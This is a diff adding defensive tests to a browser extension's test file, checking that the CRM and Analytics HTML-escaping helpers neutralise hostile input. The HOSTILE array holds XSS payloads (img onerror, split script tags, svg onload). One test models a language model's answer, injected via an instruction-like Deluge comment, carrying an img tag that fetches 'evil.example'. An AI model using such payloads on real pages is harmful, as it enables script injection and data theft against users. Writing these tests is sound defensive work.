@@ -3550,3 +3550,59 @@ for (const app of ['crm', 'analytics']) {
     catch (e) { assert.equal(e.shape, true); }
   });
 }
+
+
+// ---------------------------------------------------------------------------------------------
+// Hostile text, from the three places it can actually come from: a name somebody typed in Zoho, a
+// file in the mirror that a workspace author wrote, and an answer from a model. All three end up
+// inside HTML the panel builds as strings, in a privileged extension page, so one missed helper is
+// a DOM XSS with the extension's own permissions. The audit asked for these by name.
+//
+// What they hold is narrow on purpose: that the helpers do what they claim, on the inputs an
+// attacker would actually send. They cannot prove every call site picked the right one - that is
+// the limit of testing a helper rather than a page, and it is stated rather than implied.
+{
+  const HOSTILE = [
+    '"><img src=x onerror=alert(1)>',
+    '</scr' + 'ipt><scr' + 'ipt>alert(1)</scr' + 'ipt>',
+    '<svg/onload=alert(1)>',
+    '&"\'<>',
+    ' <scr' + 'ipt>',
+  ];
+
+  const { escHtml } = load([sliceConst('apps/crm/sidepanel.js', 'escHtml')]);
+  const { esc } = load([sliceConst('apps/analytics/sidepanel.js', 'esc')]);
+
+  test('no hostile string keeps a tag open, in either product', () => {
+    for (const s of HOSTILE) {
+      for (const [name, f] of [['crm escHtml', escHtml], ['analytics esc', esc]]) {
+        const out = f(s);
+        assert.ok(!/<[a-zA-Z/]/.test(out), name + ' let a tag through: ' + out);
+      }
+    }
+  });
+
+  test('the attribute helper closes nothing it sits in', () => {
+    for (const s of HOSTILE) {
+      const out = escA(s);
+      assert.ok(!/["\'<>]/.test(out), 'escA left a delimiter in: ' + out);
+    }
+  });
+
+  test('what the model sends is text like any other', () => {
+    // An answer is rendered, and a model can be talked into echoing markup by a Deluge comment that
+    // looks like an instruction. Same helpers, same guarantee - the tools it can reach are a fixed
+    // list elsewhere; this is only about what its words can do on the page.
+    const injected = 'Sure! <img src=x onerror=fetch("https://evil.example/")>';
+    assert.ok(!/<img/.test(escHtml(injected)));
+    assert.ok(!/<img/.test(esc(injected)));
+  });
+
+  test('null and undefined do not arrive in markup as words', () => {
+    // The Analytics helper takes `s ?? ''`; the CRM one takes String(s). Both are asserted so a
+    // change to either is deliberate rather than noticed on a page.
+    assert.equal(esc(null), '');
+    assert.equal(esc(undefined), '');
+    assert.equal(escHtml(''), '');
+  });
+}
